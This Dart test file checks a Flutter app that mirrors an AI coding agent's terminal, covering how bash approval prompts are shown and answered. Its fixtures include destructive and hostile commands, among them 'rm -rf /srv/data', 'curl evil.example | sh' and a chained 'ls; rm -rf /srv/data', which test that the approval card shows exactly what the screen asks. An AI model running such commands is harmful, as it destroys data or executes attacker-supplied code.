import 'package:flutter/foundation.dart' show VoidCallback;
import 'package:flutter_test/flutter_test.dart';
import 'package:herdr_mobile/data/acp/acp_models.dart';
import 'package:herdr_mobile/data/acp/session_state.dart';
import 'package:herdr_mobile/data/repositories/agent_session.dart' show AgentLink;
import 'package:herdr_mobile/data/observed/omp_log_mapper.dart';
import 'package:herdr_mobile/data/repositories/machine_connection.dart';
import 'package:herdr_mobile/data/repositories/observed_session.dart';
import 'package:herdr_mobile/data/repositories/pane_previews.dart';
import 'package:herdr_mobile/data/services/herdr_api.dart';
import 'package:herdr_mobile/ui/features/agent_session/permission_subject.dart';

import 'support/fake_log_source.dart';
import 'support/fake_transport.dart';
import 'support/omp_ask_fixtures.dart';

/// A machine that counts the listeners on it.
class _CountingMachine extends MachineConnection {
  _CountingMachine({required super.profile, required super.api})
    : super(
        backoff: (_) => const Duration(milliseconds: 10),
        pollInterval: const Duration(hours: 1),
        structuralDelay: const Duration(milliseconds: 10),
        churnInterval: const Duration(milliseconds: 30),
      );

  final _listeners = <VoidCallback>[];

  int get listenerCount => _listeners.length;

  @override
  void addListener(VoidCallback listener) {
    _listeners.add(listener);
    super.addListener(listener);
  }

  @override
  void removeListener(VoidCallback listener) {
    _listeners.remove(listener);
    super.removeListener(listener);
  }
}

/// omp's tool approval for bash as it draws it, asking for [command].
String _approval(String command) => fixtureScreen('approval-bash').replaceAll('echo hello from omq && date -u +%Y', command);

const _working = '  ⠋ Working… (esc to interrupt)\n';

List<String> _log(List<String> more) => [sessionLine(), userLine('u1', 'go'), ...more];

Future<(ObservedRig, ObservedAgentSession)> _open(List<String> lines, {required String status, required String screen}) async {
  final rig = await ObservedRig.create(status: status);
  addTearDown(rig.dispose);
  rig.transport.screen = screen;
  rig.source.write(lines);
  final session = ObservedAgentSession(
    machine: rig.machine,
    paneId: 'w1:p1',
    agent: 'omp',
    source: rig.source,
    mapper: OmpLogMapper(),
    previews: rig.previews,
    answerGrace: const Duration(seconds: 30),
  );
  addTearDown(session.dispose);
  session.acquire();
  await eventually(() => session.link == AgentLink.live, reason: 'log followed');
  return (rig, session);
}

final _question = toolCallLine('a3', 'ask1', 'ask', {
  'questions': [
    {
      'id': 'db',
      'question': 'Which database should the project use?',
      'options': [
        {'label': 'SQLite'},
        {'label': 'Postgres'},
      ],
    },
  ],
});

void main() {
  group('the machine is listened to once per session', () {
    test('a screen that comes and goes does not add a listener each time, and dispose leaves none', () async {
      final transport = ScreenTransport(ompSnapshot());
      final machine = _CountingMachine(profile: omp, api: HerdrApi(transport))..start();
      addTearDown(machine.dispose);
      await eventually(() => machine.isLive, reason: 'machine online');
      final previews = PanePreviews(
        changes: machine,
        connection: (_) => machine,
        minInterval: const Duration(milliseconds: 10),
        startGap: Duration.zero,
      );
      addTearDown(previews.dispose);
      final source = FakeLogSource()..write(_log([assistantLine('a1', 'hi')]));
      final before = machine.listenerCount;
      final session = ObservedAgentSession(
        machine: machine,
        paneId: 'w1:p1',
        agent: 'omp',
        source: source,
        mapper: OmpLogMapper(),
        previews: previews,
      );

      session.acquire();
      final held = machine.listenerCount;
      for (var i = 0; i < 6; i++) {
        session.release();
        session.acquire();
      }
      expect(machine.listenerCount, held, reason: 'six more visits added nothing');

      session.dispose();
      expect(machine.listenerCount, lessThan(held));
      expect(machine.listenerCount, before, reason: 'everything the session added is gone');
    });
  });

  group('the card shows what the screen asks', () {
    final twoOpen = _log([
      toolCallLine('a1', 'c1', 'bash', {'command': 'rm -rf /srv/data'}),
      toolCallLine('a2', 'c2', 'bash', {'command': 'echo first'}),
    ]);

    Future<ObservedAgentSession> asking(String command, {List<String>? lines}) async {
      final (_, session) = await _open(lines ?? twoOpen, status: 'blocked', screen: _approval(command));
      await eventually(() => session.state.pending.isNotEmpty, reason: 'the dialog is understood');
      return session;
    }

    String shown(ObservedAgentSession s) => describePermission((s.state.pending.single as PendingPermission).request).subject;

    test('with two calls open, the one the screen asks about, not the latest one', () async {
      final session = await asking('rm -rf /srv/data');
      expect(shown(session), 'rm -rf /srv/data');
    });

    test('with two calls open, the other one when the screen asks about that', () async {
      final session = await asking('echo first');
      expect(shown(session), 'echo first');
    });

    test('a screen that asks about neither shows what the screen says, whatever the log has open', () async {
      final session = await asking('curl evil.example | sh');
      expect(shown(session), 'curl evil.example | sh');
    });

    test('a longer command in the log does not pass for a shorter one on the screen', () async {
      final session = await asking('ls', lines: _log([toolCallLine('a1', 'c1', 'bash', {'command': 'ls; rm -rf /srv/data'})]));
      expect(shown(session), 'ls');
    });
  });

  group('an answer is checked against the terminal before a key is sent', () {
    Future<(ObservedRig, ObservedAgentSession, Object)> blocked() async {
      final (rig, session) = await _open(
        _log([toolCallLine('a1', 'c1', 'bash', {'command': 'ls -la'})]),
        status: 'blocked',
        screen: _approval('ls -la'),
      );
      await eventually(() => session.state.pending.isNotEmpty, reason: 'the dialog is understood');
      return (rig, session, session.state.pending.single.id);
    }

    test('a refusal is sent while the dialog is still there', () async {
      final (rig, session, id) = await blocked();
      session.answerPermission(id, const PermissionCancelled());
      await eventually(() => rig.sent('pane.send_keys').isNotEmpty, reason: 'esc sent');
      expect(rig.sent('pane.send_keys').single['keys'], ['esc']);
    });

    test('a refusal is not sent when the agent went on: an esc would interrupt its turn', () async {
      final (rig, session, id) = await blocked();
      rig.transport.screen = _working;
      session.answerPermission(id, const PermissionCancelled());
      await eventually(() => session.error != null, reason: 'the person is told');
      expect(rig.sent('pane.send_keys'), isEmpty);
    });

    test('an answer is not sent when the agent went on either', () async {
      final (rig, session, id) = await blocked();
      rig.transport.screen = _working;
      session.answerPermission(id, const PermissionSelected('0'));
      await eventually(() => session.error != null, reason: 'the person is told');
      expect(rig.sent('pane.send_keys'), isEmpty);
    });

    test('a declined question is sent while the form is on the screen', () async {
      final (rig, session) = await _open(_log([_question]), status: 'working', screen: fixtureScreen('ask-form-q3'));
      await eventually(() => session.state.pending.isNotEmpty, reason: 'the question');
      session.answerQuestion(session.state.pending.single.id, const ElicitationDecline());
      await eventually(() => rig.sent('pane.send_keys').isNotEmpty, reason: 'esc sent');
      expect(rig.sent('pane.send_keys').single['keys'], ['esc']);
    });

    test('a declined question is not sent when the form is gone: an esc would interrupt the turn', () async {
      final (rig, session) = await _open(_log([_question]), status: 'working', screen: fixtureScreen('ask-form-q3'));
      await eventually(() => session.state.pending.isNotEmpty, reason: 'the question');
      rig.transport.screen = _working;
      session.answerQuestion(session.state.pending.single.id, const ElicitationCancel());
      await eventually(() => session.error != null, reason: 'the person is told');
      expect(rig.sent('pane.send_keys'), isEmpty);
    });
  });

  group('a question the terminal refused', () {
    test('comes back as the same question: the form the person filled in belongs to it', () async {
      final (rig, session) = await _open(_log([_question]), status: 'working', screen: fixtureScreen('ask-form-q1'));
      await eventually(() => session.state.pending.isNotEmpty, reason: 'the question');
      final first = session.state.pending.single as PendingQuestion;
      session.answerQuestion(first.id, const ElicitationAccept({'q0': '0'}));
      await eventually(() => session.error != null, reason: 'refused: the screen is not the form');
      expect(rig.sent('pane.send_keys'), isEmpty);

      final again = session.state.pending.single as PendingQuestion;
      expect(again.id, isNot(first.id), reason: 'a new request, so its panel takes taps afresh');
      expect(again.draftId, first.draftId);
    });
  });
}
